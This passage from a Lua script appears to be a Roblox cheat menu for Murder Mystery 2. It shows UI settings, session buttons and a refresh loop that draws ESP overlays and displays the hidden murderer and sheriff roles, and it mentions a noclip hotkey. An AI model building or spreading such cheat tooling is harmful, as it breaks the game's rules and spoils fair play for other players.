	end,
})

ThemeCard:AddToggle({
	Title = "Glass",
	Style = "Switch",
	Flag = "glass",
	Default = false,
	Callback = function(on)
		NextUI:SetGlass(on)
	end,
})

ThemeCard:AddToggle({
	Title = "Watermark",
	Style = "Switch",
	Flag = "watermark",
	Default = true,
	Callback = function(on)
		Watermark:SetVisible(on)
	end,
})

ThemeCard:AddToggle({
	Title = "Keybind list",
	Style = "Switch",
	Flag = "keylist",
	Default = true,
	Callback = function(on)
		if KeyList then
			KeyList:SetVisible(on)
		end
	end,
})

local UiScaleSlider = ThemeCard:AddSlider({
	Title = "UI scale",
	Description = "Scales the menu, capped to the screen",
	Min = 0.8,
	Max = 2,
	Default = 1,
	Increment = 0.05,
	Suffix = "x",
	Flag = "ui_scale",
	Callback = function(value)
		applyUiScale(value)
	end,
})

ThemeCard:AddButton({
	Title = "Fit to screen",
	Description = "Scales the menu to the viewport",
	Callback = function()
		local viewport = NextUI.Gui and NextUI.Gui.AbsoluteSize or Vector2.new(1280, 720)
		local main = Window._main
		if not main or viewport.X <= 0 or viewport.Y <= 0 then
			return
		end
		local width = math.max(main.Size.X.Offset, 1)
		local height = math.max(main.Size.Y.Offset, 1)
		local scale = math.min(viewport.X / width, viewport.Y / height) - 0.04
		scale = math.clamp(scale, 0.8, 2)
		applyUiScale(scale)
		UiScaleSlider:Set(scale)
	end,
})

local ConfigCard = Settings:AddSection({ Title = "Config", Icon = "save" })
ConfigCard:AddConfigManager()

local SessionCard = Settings:AddSection({ Title = "Session", Icon = "power" })

SessionCard:AddButton({
	Title = "Rejoin",
	Description = "Hold to confirm",
	Hold = 1.5,
	Callback = function()
		pcall(function()
			TeleportService:Teleport(game.PlaceId, lp)
		end)
	end,
})

SessionCard:AddButton({
	Title = "Unload",
	Description = "Remove the menu and every hook",
	Badge = "HOT",
	Callback = function()
		Window:Dialog({
			Title = "Unload MM2?",
			Content = "ESP, movement changes and the menu will be removed.",
			Buttons = {
				{ Title = "Unload", Primary = true, Callback = unload },
				{ Title = "Cancel" },
			},
		})
	end,
})

-- Built last so every keybound element above is already registered in it.
KeyList = NextUI:CreateKeybindList({ Key = Enum.KeyCode.K, Position = "TopLeft" })

-- ============================================================
--  14 - Counters and the refresh loop
-- ============================================================

local fps = 0
local frameCount = 0
local fpsClock = os.clock()

bind(RunService.RenderStepped, function()
	frameCount = frameCount + 1
	local now = os.clock()
	local delta = now - fpsClock
	if delta >= 1 then
		fps = math.floor(frameCount / delta + 0.5)
		frameCount = 0
		fpsClock = now
	end
end)

local function getPing()
	local ok, value = pcall(function()
		return StatsService.Network.ServerStatsItem["Data Ping"]:GetValue()
	end)
	if ok and value then
		return math.floor(value + 0.5)
	end
	return 0
end

local function getMemory()
	local ok, value = pcall(function()
		return StatsService:GetTotalMemoryUsageMb()
	end)
	if ok and value then
		return math.floor(value + 0.5)
	end
	return 0
end

local function leaderstat(name)
	local folder = lp:FindFirstChild("leaderstats")
	local value = folder and folder:FindFirstChild(name)
	if value and (value:IsA("IntValue") or value:IsA("NumberValue")) then
		return value.Value
	end
	return nil
end

local function formatUptime(seconds)
	seconds = math.floor(seconds)
	local minutes = math.floor(seconds / 60)
	local hours = math.floor(minutes / 60)
	if hours > 0 then
		return string.format("%dh %02dm", hours, minutes % 60)
	end
	return string.format("%dm %02ds", minutes, seconds % 60)
end

local lastRows = {}
local function setRow(name, value)
	if lastRows[name] == value then
		return
	end
	lastRows[name] = value
	Panel:SetRow(name, value)
end

local lastBars = {}
local function setBar(key, bar, value)
	if lastBars[key] == value then
		return
	end
	lastBars[key] = value
	bar:Set(value)
end

local tick = 0

task.spawn(function()
	while running do
		task.wait(0.25)
		if not running then
			break
		end

		if state.esp.enabled then
			refreshEsp()
		elseif next(espObjs) ~= nil then
			clearAllEsp()
		end
		refreshGunEsp()

		local humanoid = getHum()
		local myRole = getRole(lp)

		setRow("Role", myRole)
		setRow("Murderer", murderer and murderer.Name or "-")
		setRow("Sheriff", sheriff and sheriff.Name or "-")

		local coins = leaderstat("Coins")
		local round = leaderstat("Round")
		setRow("Coins", coins ~= nil and tostring(coins) or "-")
		setRow("Round", round ~= nil and tostring(round) or "-")

		local health = 0
		if humanoid then
			health = math.floor(humanoid.Health + 0.5)
		end

		setBar("health", HealthBar, health)
		setBar("fps", FpsBar, fps)
		setBar("ping", PingBar, getPing())
		setBar("memory", MemBar, getMemory())

		tick = tick + 1
		if tick % 4 == 0 then
			ServerLabel:Set(string.format(
				"Players  %d / %d\nPlace ID  %d\nJob ID  %s\nUptime  %s",
				#Players:GetPlayers(),
				Players.MaxPlayers,
				game.PlaceId,
				string.sub(game.JobId, 1, 8) .. "...",
				formatUptime(os.clock() - startClock)
			))
		end
	end
end)

NextUI:Success("MM2 loaded", "Press X for ESP, N for noclip.")
